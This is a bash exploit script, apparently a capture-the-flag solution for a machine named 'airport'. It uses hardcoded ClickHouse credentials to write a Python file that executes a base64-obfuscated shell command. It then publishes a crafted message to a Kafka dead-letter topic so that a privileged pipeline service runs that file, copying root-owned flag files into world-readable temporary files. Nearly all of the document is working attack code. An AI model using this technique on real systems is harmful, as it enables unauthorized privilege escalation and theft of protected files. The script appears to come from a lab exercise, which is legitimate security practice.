#!/usr/lib/python3.14/venv bash
set -euo pipefail

CH_USER='default'
CH_PASS='N3v3rs33nD4T4'
PYTHON='/opt/aidx-pipeline/venv/bin/python'


OUT_USER="/tmp/airport-user-$(date +%s).txt"
OUT_ROOT="/tmp/airport-root-$(date +%s).txt"


CMD="cp /home/martin_cole/user.txt '$OUT_USER'; cp /root/root.txt '$OUT_ROOT'; chmod 644 '$OUT_USER' '$OUT_ROOT'"
B64=$(printf '%s' "$CMD" | base64 -w0)


SQL="INSERT INTO FUNCTION file('aidx_quarantine.py', 'LineAsString', 's String') VALUES ('import os,base64;os.system(base64.b64decode(\"${B64}\").decode())')"


clickhouse-client --user "$CH_USER" --password "$CH_PASS" -q "$SQL"


if [[ ! -x "$PYTHON" ]]; then
    echo "No se encuentra el Python del pipeline: $PYTHON"
    exit 1
fi


"$PYTHON" - <<'PY'
from confluent_kafka import Producer


p = Producer({"bootstrap.servers": "localhost:9092"})
p.produce(
    "aidx.flightleg.dlq.v1",
    b"<bad>trigger</bad>",
    headers=[("reason", b"trigger")]
)
remaining = p.flush(10)
if remaining:
    raise SystemExit(f"Quedan {remaining} mensajes sin entregar")
PY


echo "Esperando al servicio..."
for _ in $(seq 1 145); do
    if [[ -r "$OUT_USER" && -r "$OUT_ROOT" ]]; then
        echo "=== USER FLAG ==="
        cat "$OUT_USER"
        echo
        echo "=== ROOT FLAG ==="
        cat "$OUT_ROOT"
        echo
        exit 0
    fi
    sleep 1
done


echo "Los archivos no aparecieron dentro del tiempo límite."
exit 1